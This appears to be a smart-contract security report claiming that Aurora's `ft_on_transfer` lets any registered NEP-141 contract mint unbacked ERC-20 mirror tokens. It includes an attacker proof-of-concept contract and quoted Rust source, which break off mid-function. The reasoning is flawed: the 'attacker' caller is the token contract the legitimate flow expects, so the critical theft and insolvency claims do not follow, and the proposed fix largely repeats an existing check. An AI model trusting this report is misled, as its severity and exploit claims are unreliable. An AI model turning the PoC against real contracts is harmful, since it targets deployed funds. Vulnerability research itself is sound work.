### Title
Unguarded `ft_on_transfer` Callback Allows Minting of Unbacked ERC-20 Mirror Tokens — (`engine/src/contract_methods/connector.rs`)

---

### Summary

Aurora's `ft_on_transfer` function — the NEAR NEP-141 analog of ERC-721's `onERC721Received` — can be called directly by any NEAR account, not only by a legitimate NEP-141 token contract executing a `ft_transfer_call`. Because the function mints ERC-20 mirror tokens based solely on the caller-supplied `amount` argument without verifying that tokens were actually escrowed by the token contract, a malicious actor who controls any registered NEP-141 contract can mint an arbitrary quantity of its ERC-20 mirror on Aurora without depositing the corresponding NEP-141 tokens.

---

### Finding Description

The NEP-141 standard defines a two-step transfer-with-callback flow:

1. Sender calls `ft_transfer_call` on the NEP-141 token contract.
2. The token contract atomically escrows the tokens and calls `ft_on_transfer` on the receiver (Aurora).
3. Aurora mints the ERC-20 mirror tokens.

The function reads `predecessor_account_id` and dispatches: [2](#0-1) 

There is **no assertion** that the predecessor is a legitimate NEP-141 contract that has actually escrowed tokens. Any NEAR account whose account ID has a registered ERC-20 mapping in Aurora's storage can call `ft_on_transfer` directly — bypassing the `ft_transfer_call` escrow step entirely — and supply an arbitrary `amount` in the JSON input. Aurora will then call `engine.receive_erc20_tokens(...)` and credit the EVM address with that amount of ERC-20 mirror tokens.

The public NEAR entry point that exposes this is: [3](#0-2) 

Registering a NEP-141 contract on Aurora does not require owner privileges; `deploy_erc20_token` is callable by any user: [4](#0-3) 

The attacker-controlled path is therefore fully unprivileged:

1. Deploy a malicious NEP-141 contract on NEAR.
2. Call `deploy_erc20_token` on Aurora to register it and create an ERC-20 mirror.
3. Call `ft_on_transfer` directly on Aurora with `amount = <large number>` and `receiver_id = <attacker EVM address>`.
4. Aurora mints the specified amount of ERC-20 mirror tokens to the attacker with no corresponding NEP-141 deposit.

---

### Impact Explanation

The attacker holds ERC-20 mirror tokens on Aurora that are entirely unbacked. These tokens can be:

- Supplied as collateral in EVM DeFi protocols on Aurora to borrow legitimate assets (ETH, USDC, etc.), draining those pools.
- Swapped on Aurora DEXes for legitimate tokens, stealing from liquidity providers.

When legitimate holders of the same ERC-20 mirror later attempt to exit via `ExitToNear`, the NEP-141 contract will not have sufficient escrowed tokens to cover the exits, causing a permanent accounting insolvency for that token's mirror.

**Impact: Critical — direct theft of user funds and/or permanent insolvency of ERC-20 mirror accounting.**

---

### Likelihood Explanation

- The attacker needs only to deploy a NEAR contract and call two public Aurora functions. No admin access, no key compromise, no governance capture is required.
- The `ft_on_transfer` method is a standard public NEAR entry point with no access control.
- Any NEP-141 token that has been registered on Aurora (including tokens registered by the attacker themselves) is exploitable.

**Likelihood: High.**

---

### Recommendation

Add a reentrancy/caller guard to `ft_on_transfer` that enforces the NEP-141 protocol invariant: the predecessor must be a registered NEP-141 contract **and** the call must originate from a `ft_transfer_call` context (e.g., by verifying a nonce or a promise-result flag set only during the legitimate callback path). At minimum, validate that `predecessor_account_id` is a known, registered NEP-141 contract before crediting any tokens:

```rust
// Before dispatching to receive_erc20_tokens, assert the predecessor
// is a registered NEP-141 contract with an ERC-20 mapping.
let nep141_account = &predecessor_account_id;
if engine::get_erc20_from_nep141(&io, nep141_account).is_err() {
    return Err(/* ERR_UNKNOWN_NEP141 */);
}
```

Additionally, consider a boolean "in-transfer" flag written to storage at the start of `ft_transfer_call` and cleared in the callback, so that direct calls to `ft_on_transfer` that do not originate from the legitimate two-step flow are rejected.

impl AttackerContract {
    pub fn exploit(&self, aurora_account: AccountId, victim_evm_address: String) {
        // Step 1: already registered this contract as a NEP-141 on Aurora
        // via deploy_erc20_token (no owner check required).

        // Step 2: call ft_on_transfer directly on Aurora.
        // Aurora sees predecessor = this contract's account ID,
        // looks up the ERC-20 mapping, and mints tokens.
        aurora_account.call("ft_on_transfer")
            .args_json(json!({
                "sender_id": "attacker.near",
                "amount": "1000000000000000000000000",  // arbitrary large amount
                "msg": victim_evm_address
            }))
            .call();
        // Aurora mints 1e24 ERC-20 mirror tokens to victim_evm_address
        // with zero NEP-141 tokens ever deposited.
    }
}

pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}

pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes).map_err(|_| errors::ERR_BORSH_DESERIALIZE)?;

        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;

                io.return_output(
                    &borsh::to_vec(address.as_bytes()).map_err(|_| errors::ERR_SERIALIZE)?,
                );
                Ok(PromiseOrValue::Value(address))
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                let args = borsh::to_vec(&nep141).map_err(|_| errors::ERR_SERIALIZE)?;
                let base = PromiseCreateArgs {
                    target_account_id: nep141,
                    method: "ft_metadata".to_string(),
                    args: vec![],
                    attached_balance: ZERO_YOCTO,
                    attached_gas: READ_PROMISE_ATTACHED_GAS,
                };
                let callback = PromiseCreateArgs {
                    target_account_id: env.current_account_id(),
                    method: "deploy_erc20_token_callback".to_string(),
                    args,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: DEPLOY_ERC20_TOKEN_CALLBACK_ATTACHED_GAS,
                };
                // Safe because these promises are read-only calls to the main engine contract
                // and this transaction could be executed by the owner of the contract only.
                let promise_args = PromiseWithCallbackArgs { base, callback };
                let promise_id = handler.promise_create_with_callback(&promise_args);

                handler.promise_return(promise_id);

                Ok(PromiseOrValue::Promise(promise_args))
            }
        }
    })
